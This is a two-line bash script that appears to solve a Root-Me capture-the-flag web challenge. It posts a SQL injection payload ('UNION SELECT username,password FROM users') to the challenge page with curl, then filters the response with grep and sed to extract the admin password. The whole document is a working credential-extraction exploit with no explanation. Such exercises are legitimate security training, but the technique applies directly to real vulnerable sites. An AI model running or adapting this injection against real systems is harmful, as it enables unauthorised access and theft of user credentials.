#!/bin/bash
curl -s http://challenge01.root-me.org/web-serveur/ch19/?action=recherche --data "recherche=' UNION SELECT username,password FROM users --" | grep admin | sed -e "s/.*admin[^(]\+(\([^)]\+\)).*/\1/"
